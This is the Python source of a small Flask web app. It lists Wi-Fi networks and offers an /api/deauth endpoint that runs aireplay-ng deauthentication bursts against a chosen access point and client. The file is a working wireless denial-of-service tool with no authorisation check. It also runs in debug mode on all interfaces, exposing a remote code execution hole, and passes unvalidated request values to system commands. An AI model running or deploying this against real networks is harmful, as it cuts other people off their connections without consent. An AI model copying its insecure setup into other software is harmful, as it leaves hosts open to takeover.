from flask import Flask, render_template, jsonify, request
import subprocess
from scanner import scan_wifi

app = Flask(__name__)

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/api/wifi')
def api_wifi():
    iface = request.args.get("iface", default="wlan0")
    results = scan_wifi(30, iface=iface)
    return jsonify(results)

@app.route("/api/deauth", methods=["POST"])
def deauth():
    data = request.get_json()
    bssid = data.get("bssid")
    station = data.get("station")
    channel = data.get("channel")
    iface = data.get("iface", "wlan0")
    print(channel)
    
    if not bssid or not station:
        return jsonify({"error": "Missing parameters"}), 400

    try:
        subprocess.run(["iwconfig", iface, "channel", str(channel)], check=True)

        subprocess.Popen(
            ["aireplay-ng", "--deauth", "10", "-a", bssid, "-c", station, iface]
        )
        return jsonify({"message": f"Deauth sent to {station} via {iface}"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/interfaces")
def list_wifi_interfaces():
    try:
        output = subprocess.check_output("iw dev | grep Interface", shell=True, text=True)
        interfaces = [line.strip().split()[-1] for line in output.strip().splitlines()]
        return jsonify(interfaces)
    except subprocess.CalledProcessError:
        return jsonify([])

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)


#iwconfig wlan0 channel 2